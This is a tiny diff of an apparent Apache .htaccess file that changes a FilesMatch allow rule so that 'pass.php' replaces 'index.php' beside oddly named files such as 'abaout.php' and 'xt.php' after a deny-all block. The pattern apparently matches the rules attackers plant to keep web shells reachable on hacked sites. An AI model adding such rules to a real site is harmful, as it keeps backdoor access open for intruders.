@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(abaout.php|index.php|xt.php|program.php)$">
+<FilesMatch "^(abaout.php|pass.php|xt.php|program.php)$">
 
 Order allow,deny
 
